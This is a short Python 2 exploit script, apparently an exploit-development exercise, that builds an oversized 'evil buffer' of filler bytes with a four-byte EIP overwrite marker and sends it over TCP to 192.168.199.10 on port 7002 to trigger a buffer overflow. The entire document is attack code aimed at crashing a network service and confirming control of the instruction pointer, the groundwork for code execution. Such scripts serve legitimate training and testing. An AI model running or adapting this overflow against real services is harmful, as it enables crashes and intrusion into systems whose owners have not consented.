#!/usr/bin/python
import socket

print "\nSending evil buffer..."
buffer = "A" * 2080
eip = "B" * 4
offset = (2096 - (len(buffer) - len(eip))) * "C"

input_buffer = buffer + eip + offset

s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)

s.connect(("192.168.199.10", 7002))
s.send(input_buffer)

s.close()

print "\nDone!"
